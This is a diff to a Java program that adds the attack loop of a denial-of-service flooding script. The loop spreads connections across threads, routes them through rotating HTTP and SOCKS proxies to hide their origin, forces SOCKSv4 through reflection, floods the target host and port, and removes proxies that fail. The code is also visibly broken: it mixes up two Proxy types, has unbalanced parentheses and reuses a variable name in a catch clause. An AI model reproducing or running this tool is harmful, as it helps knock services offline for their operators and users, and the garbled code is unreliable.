@@ -2,9 +2,10 @@ package ping;
 
 import java.io.DataOutputStream;
 import java.lang.reflect.Method;
+import java.lang.reflect.Proxy;
 import java.net.InetSocketAddress;
-import java.net.Proxy;
 import java.net.Socket;
+import java.util.Objects;
 import java.util.Timer;
 import java.util.TimerTask;
 import java.util.concurrent.ExecutorService;
@@ -67,5 +68,85 @@ public class Run
             System.out.println("\nDoS script attack has stopped!\n");
             System.exit(-1);
         }).start();
+
+        ExecutorService executorService = Executors.newFixedThreadPool(threads);
+
+        System.out.println("\nDoS Script starting attack to " + host + ":" + port + " with " + threads + " threads.\n");
+
+        String finalServerName = host;
+
+        int finalPort = port;
+
+        for (int i = 0; i < threads; i++)
+        {
+            executorService.submit(() -> {
+                try
+                {
+                    Proxy lastProxy = null;
+                    for(int j = 0; j < connections; j++)
+                    {
+                        try
+                        {
+                            Socket socket;
+                            String newServerName = finalServerName;
+                            int newServerPort = finalPort;
+                            java.net.Proxy proxy = lastProxy = this.proxies.nextProxy();
+                            Socket secondSocket = socket = proxy.type() == java.net.Proxy.Type.HTTP ? new SocketHttp(newServerName, newServerPort, proxy.address(), timeout) : new Socket((proxy);
+
+                            if(!(socket instanceof SocketHttp))
+                            {
+                                if(socksV4)
+                                {
+                                    try
+                                    {
+                                        Method method = socket.getClass().getDeclaredMethod("getImpl", new Class[0]);
+                                        method.setAccessible(true);
+                                        Object sd = method.invoke(socket, new Object[0]);
+                                        method = sd.getClass().getDeclaredMethod("setV4", new Class[0]);
+                                        method.setAccessible(true);
+                                        method.invoke(sd, new Object[0]);
+                                    }
+                                    catch (Exception method)
+                                    {
+
+                                    }
+                                }
+
+                                socket.connect(new InetSocketAddress(newServerName, newServerPort), timeout);
+                            }
+
+                            DataOutputStream output = new DataOutputStream(socket.getOutputStream());
+                            flood.flood(output, newServerName, newServerPort);
+                            output.flush();
+                            this.connections++;
+
+                            if(print)
+                                System.out.println("DoS Script " + proxy.address().toString() + " ping -> " + newServerName + ":" + newServerPort);
+
+                            if(keepAlive) continue;
+
+
+                            socket.close();
+                            continue;
+                        }
+                        catch (Exception e)
+                        {
+                            this.failed++;
+
+                            if(!e.getMessage().contains("reply")) continue;
+
+                            this.timed++;
+
+                            if(!removeFailure)
+                                continue;
+
+                            this.proxies.removeProxy(lastProxy);
+                        }
+                    }
+                }
+                catch (Exception exception)
+                {}
+            });
+        }
     }
 }
